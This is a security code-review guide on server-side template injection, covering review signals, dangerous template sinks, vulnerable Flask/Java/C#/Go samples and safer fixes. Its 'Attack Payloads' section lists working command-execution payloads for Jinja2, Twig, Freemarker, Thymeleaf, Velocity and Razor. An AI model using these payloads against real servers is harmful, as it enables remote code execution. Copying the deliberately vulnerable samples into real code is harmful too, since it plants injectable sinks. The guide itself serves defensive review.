---
title: Review SSTI
keywords:
  - security code review
  - ssti
  - server-side template injection
  - template engine
  - thymeleaf
description: How to read code for server-side template injection—trace attacker-controlled input into template source or expressions and verify input is data, not syntax.
---

## 4.9 - Review SSTI

Server-side template injection (SSTI) appears when user input is embedded in template source, expression slots, or dynamic template names that the engine evaluates. Start from email builders, PDF generators, admin themes, and preview features. Trace each user string into Jinja2, Thymeleaf, Freemarker, Razor, and Go templates.

## What This Vulnerability Is

SSTI is a server-side code injection flaw in templating engines. Templates mix static markup with expression placeholders. When attacker-controlled text becomes part of the template itself—or is interpreted as an expression—the engine may execute code with server privileges.

The unsafe assumption is that template syntax and user data stay in separate layers. Payloads like `{{7*7}}`, `${7*7}`, or `<%= 7*7 %>` prove evaluation when reflected as `49`. This maps to [CWE-94](https://cwe.mitre.org/data/definitions/94.html) (Improper Control of Generation of Code).

## Vulnerability Characteristics (Where to Identify Them)

| Signal | Where to look |
| --- | --- |
| **Feature type** | Email preview, notification customization, PDF/HTML generators, admin theme editors |
| **Input entry** | Form fields, query parameters, stored user templates re-rendered at runtime |
| **Compile-from-string** | `Template(userInput)`, `from_string`, `process(String)`, `Parse(userText)`, Razor string compilation |
| **Expression contexts** | `${}`, `{{}}`, `#{}`, SpEL in views, inline template directives |
| **Weak controls** | `|safe`, `th:utext`, `@Html.Raw`, `autoescape=False` on user-influenced template source |
| **Distinction from XSS** | SSTI executes on the server during render; XSS executes in the victim browser |

## Attack Payloads

Use these in authorized tests when user input reaches template source or expression slots. A math probe that returns `49` confirms evaluation. Replace probes with impact payloads only in authorized environments.

### Pattern 1: Detection probes (math evaluation)

```text
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
${{7*7}}
*{7*7}
```

### Pattern 2: Jinja2 / Flask

```jinja2
{{config}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Pattern 3: Twig (PHP)

```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
```

### Pattern 4: Freemarker (Java)

```freemarker
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### Pattern 5: Thymeleaf / Spring

```text
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
${T(java.lang.Runtime).getRuntime().exec('id')}
```

### Pattern 6: Pebble / Velocity / Razor-style

```text
{% set cmd = 'id' %}{% import cmd %}
#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
@(1+2); System.Diagnostics.Process.Start("cmd.exe","/c id");
```

## Language-Specific Sinks and Dangerous APIs

Search for compile-from-string and expression evaluation in template engines. User data must stay in the data layer, never in template syntax.

### Python (Jinja2)

```python
Template("Hello {{ " + name + " }}").render()
env.from_string(user_template).render()
render_template_string(user_html)
Environment(autoescape=False).from_string(user_src)
```

### Java (Thymeleaf / Freemarker / Velocity)

```java
templateEngine.process(userTemplate, context);
cfg.getTemplate(userPath).process(data, writer);
Velocity.evaluate(context, writer, "", userSnippet);
```

### C# (Razor)

```csharp
var result = Razor.Parse(userTemplate);
Engine.Razor.RunCompile(userContent, "dynamic", null, model);
@Html.Raw(userTemplate)  // when template source is user-controlled
```

### JavaScript (Handlebars / EJS / Nunjucks)

```javascript
handlebars.compile(userTemplate)(data);
ejs.render(userTemplate, data);
nunjucks.renderString(userTemplate, data);
```

### Go (text/template vs html/template)

```go
tmpl, _ := template.New("t").Parse(userTemplate)  // text/template executes code
tmpl.Execute(w, data)
```

### HTML (server-side includes with expression engines)

```jsp
<c:set var="tpl" value="${param.template}"/>
${userExpression}  <!-- EL evaluated server-side -->
```

## Sample Vulnerable Code in Python

```python
from flask import Flask, request
from jinja2 import Environment, Template

app = Flask(__name__)

@app.route("/email/preview")
def email_preview():
    # Attacker-controlled subject line — may contain template syntax
    subject = request.args.get("subject", "Your invoice")
    # Sink: user input concatenated into template source before compile
    template = Template("Subject: {{ " + subject + " }}")
    return template.render()
```

## Step-by-Step Review Walkthrough

1. **Search for templates built from strings.** Find `Template(userInput)`, `render_template_string`, `from_string`, and concatenation before compile.
2. **Trace the Python (or equivalent) input path.** In the sample, `subject` is embedded in template source. Payloads like `{{7*7}}` or sandbox escape probes execute on the server.
3. **Review preview and customization features.** Email and notification editors that save and re-render user template source are high risk.
4. **Inspect expression contexts.** `${}`, `{{}}`, SpEL, and inline eval-style directives in views accept attacker syntax when user data crosses layers.
5. **Check data vs template separation.** User data should pass only as model variables while template files remain static on disk.
6. **Review sandbox settings.** Jinja2 `SandboxedEnvironment` is for trusted-admin use only, with audit logging—not a default for HTTP input.
7. **Distinguish SSTI from XSS.** SSTI impact is server-side RCE or file read; XSS impact is victim browser execution.

## Risk Impact Analysis

**Remote code execution.** Template engines often expose builtins that reach file I/O, subprocesses, or reflection when attacker text is compiled as template source.

**Credential and secret theft.** Server-side execution can read environment variables, config files, and in-process secrets.

**Full application compromise.** SSTI on admin preview endpoints may run with elevated privileges and broad network access.

**Persistent backdoors.** User-authored templates stored and re-rendered can maintain access across sessions when sandboxing is absent.

## Vulnerable Examples in Other Languages

### Java

```java
public String renderNewsletterPreview(String userSubject, Map<String, Object> ctx) {
    Configuration cfg = new Configuration(Configuration.VERSION_2_3_32);
    Template tpl = new Template("preview", "Newsletter: ${subject}", cfg);
    ctx.put("subject", userSubject); // userSubject may contain ${...} directives
    StringWriter out = new StringWriter();
    tpl.process(ctx, out);
    return out.toString();
}
```

### C#

```csharp
public IActionResult PreviewInvoice([FromForm] string headerHtml)
{
    var engine = new RazorLightEngineBuilder()
        .UseMemoryCachingProvider()
        .Build();
    var html = engine.CompileRenderStringAsync(
        Guid.NewGuid().ToString(), headerHtml, model).Result;
    return Content(html, "text/html");
}
```

### HTML

```html
<!-- Admin email preview compiles user-supplied header as template source -->
<form action="/email/preview" method="post">
  <textarea name="header">Invoice {{invoice_id}}</textarea>
  <!-- Attacker adds {{7*7}} or engine-specific directives -->
</form>

<!-- Notification builder treats stored snippet as template source -->
<div>${userHeaderSnippet}</div>
```

### Go

```go
func previewNewsletter(w http.ResponseWriter, r *http.Request) {
    header := r.FormValue("header")
    tmpl, _ := template.New("preview").Parse("{{ define \"main\" }}" + header + "{{ end }}")
    tmpl.ExecuteTemplate(w, "main", nil)
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Load templates from files. Pass user data only as render variables.

```python
from flask import Flask, render_template, request

app = Flask(__name__)

@app.route("/email/preview")
def email_preview():
    subject = request.args.get("subject", "Your invoice")
    return render_template("email_preview.html", subject=subject)
```

```html
{# email_preview.html — static template file *#}
<p>Subject: {{ subject }}</p>
```

**Important:** Never call `Environment.from_string()` or `Template()` on HTTP request data. Use `FileSystemLoader` with static templates on disk.

```python
# Rich text — sanitize, do not compile as template:
import bleach
clean_subject = bleach.clean(subject, tags=[], strip=True)
```

### Java

Precompile static templates from classpath resources. Pass user content via model attributes only.

```java
@GetMapping("/email/preview")
public String preview(@RequestParam String subject, Model model) {
    model.addAttribute("subject", subject); // data variable, not template source
    return "email_preview"; // static email_preview.html with th:text="${subject}"
}
```

```html
<!-- email_preview.html -->
<p th:text="${subject}"></p>
```

**Important:** Never call `TemplateEngine.process(String userTpl, ...)` on HTTP input. Avoid `th:utext` on untrusted fields.

### C#

Ship precompiled Razor views. Do not compile arbitrary strings from users.

```cshtml
@* EmailPreview.cshtml — user content as encoded model field *@
<p>@Model.Subject</p>
```

```csharp
public IActionResult Preview(EmailPreviewRequest request)
{
    return View(new EmailPreviewViewModel { Subject = request.Subject });
}
```

**Important:** Avoid `CompileRenderStringAsync` on HTTP bodies unless heavily sandboxed and restricted to break-glass admin roles.

### Go

Parse known template files at startup. Never `Parse(userInput)` on request bodies.

```go
//go:embed templates/*
var tmplFS embed.FS

var emailTmpl = template.Must(
    template.ParseFS(tmplFS, "templates/email_preview.html"))

func emailPreview(w http.ResponseWriter, r *http.Request) {
    subject := r.URL.Query().Get("subject")
    emailTmpl.Execute(w, struct{ Subject string }{Subject: subject})
}
```

**Important:** Pass user strings as template data fields, not as template definitions. Use `embed.FS` or `ParseGlob` at startup.

## Verify During Review

- User input is passed as template data variables, never concatenated into template source.
- No runtime `from_string`, `process(String)`, `Parse(userText)`, or Razor string compilation on HTTP input.
- Rich text features use sanitization libraries, not full template engines on user-authored markup.
- Preview and customization features require strong authorization and audit logging.
- Auto-escape defaults remain enabled; unsafe unescaped sinks are absent on untrusted fields.
- Engine-specific SSTI probes are covered in security tests for each dynamic render path.

## Reference

- [CWE-94: Improper Control of Generation of Code](https://cwe.mitre.org/data/definitions/94.html)
- [OWASP Server-Side Template Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection)
- [Jinja2 — Template Designer Documentation](https://jinja.palletsprojects.com/en/stable/templates/)
- [Jinja2 SandboxedEnvironment](https://jinja.palletsprojects.com/en/stable/sandbox/)
- [Thymeleaf — th:text vs th:utext](https://www.thymeleaf.org/doc/tutorials/3.1/usingthymeleaf.html#text-inlining)
- [ASP.NET Core Razor views](https://learn.microsoft.com/en-us/aspnet/core/mvc/views/overview)
- [Go html/template package](https://pkg.go.dev/html/template)
- [bleach documentation](https://bleach.readthedocs.io/en/latest/)
